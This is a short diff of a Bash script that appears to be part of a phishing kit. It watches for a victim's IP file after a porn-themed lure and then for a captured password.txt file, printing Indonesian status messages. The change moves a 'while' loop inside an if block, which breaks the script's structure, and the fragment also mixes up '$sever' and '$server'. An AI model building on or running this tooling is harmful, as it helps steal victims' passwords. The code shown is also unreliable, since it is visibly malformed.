@@ -32,12 +32,12 @@ if [[ -e "site/$sever/ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Target open Bokep!\n"
 hedygans
 rm -rf ip.txt
+while [ true ]; do
 
 fi
 
 sleep 0.5
 
-while [ true ]; do
 if [[ -e "site/$server/password.txt" ]]; then
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Target menulis!\n"
 password
